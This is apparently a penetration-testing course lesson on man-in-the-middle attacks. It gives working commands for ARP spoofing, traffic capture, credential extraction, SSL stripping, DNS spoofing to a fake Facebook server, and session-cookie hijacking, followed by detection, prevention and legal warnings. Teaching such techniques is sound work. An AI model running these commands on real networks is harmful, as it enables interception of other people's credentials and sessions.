# Lesson 2.4: Man-in-the-Middle Attacks

## Objective
Understand and perform Man-in-the-Middle (MITM) attacks including ARP spoofing, traffic interception, and session hijacking.

---

## What is a MITM Attack?

**Man-in-the-Middle:** Attacker intercepts communication between two parties without their knowledge.

```
Normal Communication:
Client <-----------> Server

MITM Attack:
Client <----> Attacker <----> Server
              (intercepts,
               reads, modifies)
```

---

## ARP Spoofing/Poisoning

### ARP Review

**ARP (Address Resolution Protocol)** - Maps IP addresses to MAC addresses on local network.

```
Computer A: "Who has 192.168.1.1? Tell 192.168.1.100"
Router:     "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
```

### How ARP Spoofing Works

```
Normal ARP Cache:
192.168.1.1   -> AA:BB:CC:DD:EE:FF (Router MAC)
192.168.1.100 -> 11:22:33:44:55:66 (Victim MAC)

After ARP Spoofing:
192.168.1.1   -> XX:XX:XX:XX:XX:XX (Attacker MAC)  <- POISONED!
192.168.1.100 -> 11:22:33:44:55:66 (Victim MAC)
```

**Attacker sends fake ARP responses:**
- To victim: "I am the router (gateway)"
- To router: "I am the victim"
- All traffic flows through attacker

---

## Performing ARP Spoofing

### Prerequisites

1. **Same network** as victim and gateway
2. **IP forwarding enabled** (to avoid DoS)
3. **Root/admin privileges**

### Enable IP Forwarding

```bash
# Linux
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Verify
cat /proc/sys/net/ipv4/ip_forward  # Should output: 1
```

**Why?** Without forwarding, traffic dies at attacker = accidental DoS.

---

### Method 1: arpspoof (dsniff package)

```bash
# Install
apt install dsniff

# Spoof victim (tell victim we are the gateway)
arpspoof -i eth0 -t <victim_ip> <gateway_ip>

# Spoof gateway (tell gateway we are the victim)
arpspoof -i eth0 -t <gateway_ip> <victim_ip>

# Run both in separate terminals!
```

**Example:**
```bash
# Terminal 1: Tell victim (192.168.1.100) that we are gateway (192.168.1.1)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Tell gateway that we are victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

---

### Method 2: Ettercap

```bash
# Install
apt install ettercap-text-only ettercap-graphical

# Text mode
ettercap -T -i eth0 -M arp:remote /<victim_ip>// /<gateway_ip>//

# Example
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Graphical mode
sudo ettercap -G
```

**Ettercap Features:**
- Built-in packet filtering
- Password extraction
- SSL stripping
- Plugin support

---

### Method 3: Bettercap

```bash
# Install
apt install bettercap

# Run bettercap
sudo bettercap -iface eth0

# Inside bettercap console:
net.probe on                          # Discover hosts
set arp.spoof.targets <victim_ip>     # Set target
arp.spoof on                          # Start spoofing
net.sniff on                          # Start sniffing
```

**Bettercap is modern and powerful** - recommended for professional pentesting.

---

## Capturing Traffic

### Using tcpdump

```bash
# Capture all traffic on interface
sudo tcpdump -i eth0

# Save to file
sudo tcpdump -i eth0 -w capture.pcap

# Filter by host
sudo tcpdump -i eth0 host 192.168.1.100

# Filter by port
sudo tcpdump -i eth0 port 80

# HTTP traffic only
sudo tcpdump -i eth0 'tcp port 80'

# Show packet contents
sudo tcpdump -i eth0 -A

# Combined example: Capture victim's HTTP traffic
sudo tcpdump -i eth0 host 192.168.1.100 and port 80 -w http_capture.pcap
```

---

### Using Wireshark

```bash
# Install
apt install wireshark

# Run (GUI)
sudo wireshark

# Or capture with tcpdump, analyze with Wireshark
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap
```

**Wireshark Features:**
- Follow TCP streams
- Extract files from captures
- Decode protocols
- Filter by application
- Colorized packet display

---

## Extracting Credentials

### HTTP Credentials

**Using tcpdump:**
```bash
tcpdump -i eth0 -A | grep -i "authorization:"
tcpdump -i eth0 -A | grep -i "password"
```

**Using Wireshark:**
1. Filter: `http.request.method == "POST"`
2. Follow HTTP stream
3. Look for form data with passwords

**Using Ettercap:**
```bash
# Ettercap automatically extracts passwords
sudo ettercap -T -i eth0 -M arp:remote /target_ip// /gateway_ip//
```

---

### FTP Credentials

```bash
# tcpdump
tcpdump -i eth0 -A | grep -E "USER|PASS"

# Wireshark filter
ftp.request.command == "USER" or ftp.request.command == "PASS"
```

**FTP is plaintext** - username and password visible!

---

### Telnet Credentials

```bash
# All Telnet traffic is plaintext
tcpdump -i eth0 -A port 23
```

---

## SSL Stripping

### What is SSL Stripping?

**Downgrade HTTPS to HTTP** to intercept encrypted traffic.

```
Normal:
User --> HTTPS --> Server

SSL Stripping:
User --> HTTP --> Attacker --> HTTPS --> Server
```

User thinks they're on HTTPS, but connection to attacker is HTTP!

---

### Using sslstrip

```bash
# Install
apt install sslstrip

# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: Redirect HTTP traffic to sslstrip
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Step 3: Run sslstrip
sslstrip -l 8080 -w sslstrip.log

# Step 4: Start ARP spoofing (separate terminal)
arpspoof -i eth0 -t <victim_ip> <gateway_ip>

# Step 5: View captured credentials
tail -f sslstrip.log
```

**Note:** Modern browsers with HSTS (HTTP Strict Transport Security) prevent SSL stripping.

---

## DNS Spoofing

### What is DNS Spoofing?

**Redirect DNS queries** to attacker-controlled IPs.

```
Victim queries: facebook.com
Attacker responds: 192.168.1.200 (fake server)
```

---

### Using Ettercap DNS Spoofing

```bash
# Edit DNS file
sudo nano /etc/ettercap/etter.dns

# Add entries:
facebook.com    A    192.168.1.200
*.facebook.com  A    192.168.1.200

# Run Ettercap with dns_spoof plugin
sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /<victim_ip>// /<gateway_ip>//
```

Now when victim visits facebook.com, they get attacker's IP!

---

### Using Bettercap DNS Spoofing

```bash
# Start bettercap
sudo bettercap -iface eth0

# Configure DNS spoofing
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.200
dns.spoof on

# Start ARP spoofing
set arp.spoof.targets <victim_ip>
arp.spoof on
```

---

## Session Hijacking

### HTTP Session Hijacking

**Steal session cookies** to impersonate victim.

```bash
# Capture cookies with Wireshark
# Filter: http.cookie

# Or use ferret and hamster
sudo ferret -i eth0
# Then browse to http://localhost:1234 (hamster interface)
```

**Using cookies:**
1. Capture victim's session cookie
2. Inject into your browser
3. Access account as victim

**Browser extension:** Cookie Editor, EditThisCookie

---

## Complete MITM Attack Example

### Scenario: Capture victim's credentials

```bash
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: Start ARP spoofing
# Terminal 1
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Step 3: Capture traffic
# Terminal 3
sudo tcpdump -i eth0 host 192.168.1.100 -w victim_capture.pcap

# Step 4: Analyze in Wireshark
wireshark victim_capture.pcap

# Look for:
# - HTTP POST requests (form submissions)
# - FTP credentials (USER/PASS commands)
# - Cookies (http.cookie)
```

---

## Detection and Prevention

### Detecting ARP Spoofing

```bash
# Monitor ARP cache for changes
watch -n 1 arp -a

# Use arpwatch
sudo apt install arpwatch
sudo arpwatch -i eth0

# Static ARP entries (prevent spoofing)
sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
```

**Signs of ARP spoofing:**
- Duplicate IP addresses
- MAC address changes for same IP
- Unexpected MAC addresses for gateway
- Increased network latency

---

### Preventing MITM Attacks

**Network Level:**
- Use encrypted protocols (HTTPS, SSH, SFTP)
- Enable HSTS (HTTP Strict Transport Security)
- Implement 802.1X authentication
- Use VPNs for sensitive connections
- Static ARP entries on critical hosts
- Port security on switches

**Switch Security:**
- Dynamic ARP Inspection (DAI)
- DHCP Snooping
- Port security (limit MACs per port)

**User Level:**
- Check for HTTPS (padlock icon)
- Be suspicious of certificate warnings
- Use VPN on untrusted networks
- Don't ignore security warnings

---

## Tools Summary

| Tool | Purpose | Difficulty |
|------|---------|-----------|
| arpspoof | ARP poisoning | Easy |
| Ettercap | Comprehensive MITM | Medium |
| Bettercap | Modern MITM framework | Medium |
| sslstrip | SSL downgrade | Medium |
| tcpdump | Packet capture | Easy |
| Wireshark | Packet analysis | Easy |
| mitmproxy | HTTP(S) proxy | Medium |

---

## Hands-On Exercises

### Exercise 1: Basic ARP Spoofing (Lab Only!)

```bash
# Setup:
# - 3 VMs: Attacker (Kali), Victim (any OS), Gateway/Router

# 1. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. Check current ARP cache on victim
arp -a

# 3. Start ARP spoofing from attacker
sudo arpspoof -i eth0 -t <victim_ip> <gateway_ip>

# 4. Check ARP cache on victim again
arp -a  # Gateway MAC should now be attacker's MAC

# 5. Verify victim can still access internet
ping 8.8.8.8  # From victim

# 6. Stop spoofing, verify ARP cache returns to normal
```

### Exercise 2: Traffic Capture

```bash
# While ARP spoofing is active:

# 1. Start packet capture
sudo tcpdump -i eth0 host <victim_ip> -w capture.pcap

# 2. From victim, browse to HTTP site
# (Use http://testphp.vulnweb.com for testing)

# 3. Analyze capture
wireshark capture.pcap

# 4. Find HTTP requests
# Filter: http.request

# 5. Follow TCP stream
# Right-click packet -> Follow -> TCP Stream
```

### Exercise 3: Credential Extraction

```bash
# 1. Start Ettercap with automatic password collection
sudo ettercap -T -i eth0 -M arp:remote /<victim_ip>// /<gateway_ip>//

# 2. From victim, login to HTTP site (testing site only!)

# 3. Watch Ettercap output for captured credentials
```

---

## Legal and Ethical Warnings

### CRITICAL WARNINGS:

**Only perform MITM attacks in:**
- Your own lab network
- Authorized penetration test (in writing!)
- Educational CTF environments

**NEVER:**
- Attack public networks
- Intercept traffic without authorization
- Use on production networks without permission
- Perform on coffee shop WiFi or public networks

**Legal consequences:**
- Wiretapping charges
- Unauthorized access
- Federal crimes in most countries

**Always get written authorization!**

---

## Key Takeaways

1. MITM attacks intercept communication between parties
2. ARP spoofing is most common MITM technique on LANs
3. IP forwarding must be enabled to avoid DoS
4. Encrypted protocols (HTTPS, SSH) protect against simple MITM
5. SSL stripping can downgrade HTTPS to HTTP
6. Switch security features can prevent ARP spoofing
7. Authorization is mandatory - MITM attacks are illegal without permission

---

## Next Module
**Module 03: Web Application Security** - Move on to web application testing, SQL injection, and OWASP Top 10 vulnerabilities.
